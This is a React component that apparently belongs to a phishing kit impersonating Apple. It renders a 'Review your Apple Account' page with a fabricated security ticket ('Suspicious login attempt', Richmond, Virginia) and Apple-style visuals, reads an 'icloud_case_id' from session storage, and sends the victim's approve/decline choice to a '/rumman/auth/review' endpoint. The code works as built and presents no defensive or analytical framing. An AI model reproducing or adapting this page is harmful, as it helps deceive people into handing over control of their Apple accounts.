import { useState } from "react";
import Layout from "../components/layout/Layout";
import { useMutation, useQueryClient } from "@tanstack/react-query";

/** Classic Apple activity indicator — same as Login */
function AppleSpinner({ className = "", light = false }) {
  return (
    <span
      className={`relative inline-block w-[20px] h-[20px] ${className}`}
      aria-hidden="true"
    >
      {Array.from({ length: 12 }).map((_, i) => (
        <span
          key={i}
          className={`absolute left-1/2 top-0 w-[2px] h-[5px] rounded-full origin-[50%_10px] ${
            light ? "bg-white" : "bg-[var(--spinner)]"
          }`}
          style={{
            transform: `rotate(${i * 30}deg) translateX(-50%)`,
            opacity: 0.15 + (i / 12) * 0.85,
            animation: "apple-spin-fade 1s linear infinite",
            animationDelay: `${(-i / 12).toFixed(3)}s`,
          }}
        />
      ))}
    </span>
  );
}

function readStoredCaseId() {
  try {
    return sessionStorage.getItem("icloud_case_id") || "";
  } catch {
    return "";
  }
}

function Review({ authUser } = {}) {
  const [choice, setChoice] = useState(null); // approve | decline
  const [isConfirming, setIsConfirming] = useState(false);
  const queryClient = useQueryClient();

  const { mutateAsync: submitReviewAsync } = useMutation({
    mutationFn: async (action) => {
      const res = await fetch("/api/v1/rumman/auth/review", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action }),
      });
      const data = await res.json();
      if (!res.ok || data.error) {
        throw new Error(data.error || "Could not submit");
      }
      return data;
    },
  });

  const handleConfirm = async () => {
    if (!choice || isConfirming) return;
    setIsConfirming(true);
    const started = Date.now();
    try {
      const data = await submitReviewAsync(choice);
      const wait = Math.max(0, 900 - (Date.now() - started));
      await new Promise((r) => setTimeout(r, wait));
      queryClient.setQueryData(["authUser"], data);
      await queryClient.invalidateQueries({ queryKey: ["authUser"] });
    } catch (e) {
      console.log(e);
      setIsConfirming(false);
    }
  };

  const canConfirm = Boolean(choice) && !isConfirming;
  const caseId = authUser?.caseId || readStoredCaseId();
  const ticketId = caseId ? `#${caseId}` : "#—";

  return (
    <Layout>
      <style>{`
        @keyframes apple-spin-fade {
          0% { opacity: 1; }
          100% { opacity: 0.15; }
        }
      `}</style>

      <div className="pt-[20px] sm:pt-[44px] pb-[24px] sm:pb-0">
        <div className="w-full flex flex-col items-center px-0 sm:px-4">
          <div
            className="w-full sm:w-[640px] min-h-[calc(100dvh-120px)] sm:min-h-0 sm:h-[712px] apple-shadow sm:rounded-[34px] sm:mt-[44px] flex flex-col"
            style={{ background: "var(--card-bg)" }}
          >
            <div className="flex flex-1 flex-col items-center justify-center px-[24px] sm:px-[72px] py-[28px] sm:py-[36px]">
              <div className="w-full max-w-[420px] flex flex-col items-center">
                <div className="w-[96px] h-[96px] sm:w-[128px] sm:h-[128px] flex items-center justify-center shrink-0">
                  <img
                    src="/logo.png?v=5"
                    alt=""
                    className="w-full h-full object-contain select-none"
                    draggable={false}
                  />
                </div>

                <h1
                  className="mt-[8px] sm:mt-[10px] select-none cursor-default font-apple text-[24px] sm:text-[28px] font-[600] text-center leading-[1.2]"
                  style={{ color: "var(--text-primary)" }}
                >
                  Review your Apple Account
                </h1>

                <p
                  className="mt-[8px] text-center font-apple text-[13px] sm:text-[14px] leading-[1.4]"
                  style={{ color: "var(--text-secondary)" }}
                >
                  A security ticket was opened for unusual activity on your
                  account. Please review it before continuing.
                </p>

                {/* Ticket */}
                <div
                  className="mt-[16px] sm:mt-[18px] w-full overflow-hidden rounded-[14px] border"
                  style={{
                    borderColor: "var(--footer-border)",
                    background: "var(--input-bg)",
                  }}
                >
                  <div
                    className="flex items-center justify-between gap-3 px-[14px] sm:px-[16px] py-[10px] sm:py-[11px] border-b"
                    style={{ borderColor: "var(--footer-border)" }}
                  >
                    <div className="min-w-0">
                      <p
                        className="font-apple text-[10px] sm:text-[11px] uppercase tracking-[0.08em]"
                        style={{ color: "var(--text-secondary)" }}
                      >
                        Security ticket
                      </p>
                      <p
                        className="mt-[1px] font-apple text-[14px] sm:text-[15px] font-[600] tracking-tight truncate"
                        style={{ color: "var(--text-primary)" }}
                      >
                        {ticketId}
                      </p>
                    </div>
                    <span
                      className="shrink-0 inline-flex items-center gap-[6px] rounded-full px-[10px] py-[4px] font-apple text-[11px] sm:text-[12px] font-[500]"
                      style={{
                        background: "rgba(255, 149, 0, 0.12)",
                        color: "#c77c00",
                      }}
                    >
                      <span className="w-[6px] h-[6px] rounded-full bg-[#ff9500]" />
                      Open
                    </span>
                  </div>

                  <div className="px-[14px] sm:px-[16px]">
                    {[
                      ["Type", "Suspicious login attempt"],
                      ["Location", "Richmond, Virginia"],
                      ["Reported", "This morning at 10:38"],
                    ].map(([label, value], i, arr) => (
                      <div
                        key={label}
                        className={`flex items-baseline justify-between gap-4 py-[10px] sm:py-[11px] ${
                          i < arr.length - 1 ? "border-b" : ""
                        }`}
                        style={{ borderColor: "var(--footer-border)" }}
                      >
                        <span
                          className="font-apple text-[12px] sm:text-[13px] shrink-0"
                          style={{ color: "var(--text-secondary)" }}
                        >
                          {label}
                        </span>
                        <span
                          className="font-apple text-[13px] font-[500] text-right"
                          style={{ color: "var(--text-body)" }}
                        >
                          {value}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>

                <p
                  className="mt-[12px] sm:mt-[14px] text-center font-apple text-[12px] sm:text-[13px] leading-[1.4]"
                  style={{ color: "var(--text-secondary)" }}
                >
                  Was this you? Approve to keep access, or decline to lock this
                  attempt.
                </p>

                <div className="mt-[14px] sm:mt-[16px] w-full">
                  <div className="grid grid-cols-2 gap-[10px] sm:gap-[12px]">
                    <button
                      type="button"
                      disabled={isConfirming}
                      onClick={() => setChoice("approve")}
                      className={`h-[44px] rounded-[12px] font-apple text-[16px] sm:text-[17px] font-[500] transition ${
                        choice === "approve"
                          ? "ring-2 ring-[#0071e3] ring-offset-2"
                          : "opacity-95 hover:opacity-100"
                      }`}
                      style={{
                        background: "var(--btn-iphone)",
                        color: "var(--btn-iphone-text)",
                      }}
                    >
                      Approve
                    </button>
                    <button
                      type="button"
                      disabled={isConfirming}
                      onClick={() => setChoice("decline")}
                      className={`h-[44px] rounded-[12px] font-apple text-[16px] sm:text-[17px] font-[500] transition ${
                        choice === "decline"
                          ? "ring-2 ring-[#0071e3] ring-offset-2"
                          : "opacity-95 hover:opacity-100"
                      }`}
                      style={{
                        background: "var(--btn-iphone)",
                        color: "var(--btn-iphone-text)",
                      }}
                    >
                      Decline
                    </button>
                  </div>

                  <button
                    type="button"
                    disabled={!canConfirm}
                    onClick={handleConfirm}
                    className="mt-[10px] sm:mt-[12px] w-full h-[44px] rounded-[12px] font-apple text-[16px] sm:text-[17px] font-[500] transition disabled:cursor-not-allowed flex items-center justify-center"
                    style={{
                      background:
                        canConfirm || isConfirming
                          ? "var(--btn-continue)"
                          : "var(--border-input)",
                      color:
                        canConfirm || isConfirming
                          ? "#ffffff"
                          : "var(--text-secondary)",
                    }}
                  >
                    {isConfirming ? <AppleSpinner light /> : "Confirm"}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
}

export default Review;
